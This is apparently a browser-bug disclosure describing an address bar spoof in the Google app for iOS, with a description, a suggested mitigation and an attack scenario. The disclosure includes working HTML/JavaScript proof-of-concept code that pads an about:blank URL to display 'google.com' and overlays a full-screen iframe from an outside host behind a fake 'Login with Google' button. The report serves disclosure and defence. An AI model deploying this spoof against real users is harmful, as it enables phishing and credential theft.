# Title: Google App iOS Full Address Bar Spoof

## Description: 
Using the Google app for iOS when navigating to a site from the search or entering the URL manually the address bar only shows the origin of it, this is normally when the scheme is http/https but if we open a new tab with location of about:blank the address bar now doesn't have an origin it will display the full URL, and the issue is also arises that if the URL is too long the UI will show the end of it, for example opening about:blank#(multiple _spaces) google.com the address bar display (multiple _spaces) google.com and hides the about:blank# part making the address bar spoofed and a user thinks it's on google.com

POC
When creating a POC I encountered a problem which when opening a URL with about:blank#test the app immediately closed the tab and got an error but I found a solution to this problem by creating an about:blank page then from there creating a second about:blank#test which didn't get any errors, also the app doesn't have popup blocking protection making the attack without any user interaction.

Online POC open in Google app iOS: https://REDACTED

Video POC: Bug-001.mp4

POC Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>

var v='';
        function poc() {
// Opening first about:blank page
v=window.open('about:blank');

// Wait a little and open a second about:blank page with a hash fragment
setTimeout(()=>{
v.document.body.innerHTML=`
<img src=x onerror='var c=window.open("about:blank#.         google.com      \u2b1e");
c.document.body.innerHTML=&#x27;<iframe src="https://pwr.wtf/arc/5.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>&#x27;'>
`
},10);
        }
poc();
    </script>
</head>
<body>
        <h1>
        <center><br><br><br><button style=font-size:30px onclick=poc()>Login with Google</button></center>
        </h1>
</body>
</html>
```
Mitigation
When the URL is about:blank show an empty address bar or show the start of URL not end of it

Attack scenario
An attacker with this vulnerability can deceive users into thinking they are on a legitimate site and enter their credentials. As a browser vulnerability, address bar spoofing allows attackers to manipulate the URL displayed in a browser's address bar, making a fraudulent site appear legitimate. This can lead users to unknowingly share sensitive information, download malicious software, or conduct financial transactions on compromised sites, posing a serious security risk and undermining user trust in the browser’s ability to verify site authenticity.

## Author: Renwa

## Affected Browser(s): Google iOS

## Severity: High

## Spoof Type: non-http scheme

## References: N/A

## POC Photo/Video: `bug-001.mp4`

## Discovery Date: 2024-10-31

